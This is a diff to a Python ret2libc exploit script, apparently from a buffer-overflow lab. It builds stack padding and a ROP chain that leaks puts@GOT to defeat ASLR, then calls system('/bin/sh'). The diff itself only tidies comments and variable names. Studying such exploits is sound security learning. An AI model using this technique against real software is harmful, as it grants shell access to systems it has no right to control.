@@ -5,6 +5,8 @@ import binascii
 
 DEBUG = False
 
+scanf_buffer_size = 128
+
 
 def int_to_address(i):
     # slice off '0x' and create bytearray:
@@ -16,14 +18,15 @@ def int_to_address(i):
     return x[::-1]
 
 
-# addresses valid only with disabled aslr:
+# addresses valid only with disabled aslr,
+# these will be used to calculate the offset to libc:
 system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
 exit_call = b"\x00\x00\x7f\xff\xf7\xe1\x51\x00"[::-1]
 bin_sh_string = b"\x00\x00\x7F\xFF\xF7\xF6\xE8\x82"[::-1]
 
 # filler:
-buffer = 128 * b"a"  # 0x61
-backup_base_pointer = 8 * b"b"
+buffer = scanf_buffer_size * b"a"  # 0x61
+backup_base_pointer = 8 * b"b"  # 0x62
 
 # addresses valid with enabled aslr:
 rop_pop_rdi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]
@@ -41,7 +44,7 @@ payload1 = (
     buffer  # padding.
     + backup_base_pointer  # padding.
     + rop_pop_rdi_ret  # pops puts_got.
-    + puts_got  # points to address effected by aslr.
+    + puts_got  # points to address affected by aslr.
     + rop_puts  # outputs address that puts_got points to.
     + main_line0  # restarts app for second payload.
 )
@@ -80,7 +83,6 @@ print(" (check with gdb> x/i 0x... or gdb gef> got)")
 
 libc_start_noaslr = 0x7FFFF7DD6000
 offset_to_libc = 0x75E10
-
 #######
 
 # with aslr:
@@ -110,7 +112,6 @@ print(" (compare with gdb> info proc map)")
 bin_sh_offset = 0x198882
 system_offset = 0x49860
 exit_offset = 0x3F100
-
 #######
 
 bin_sh_string = bin_sh_offset + libc_start
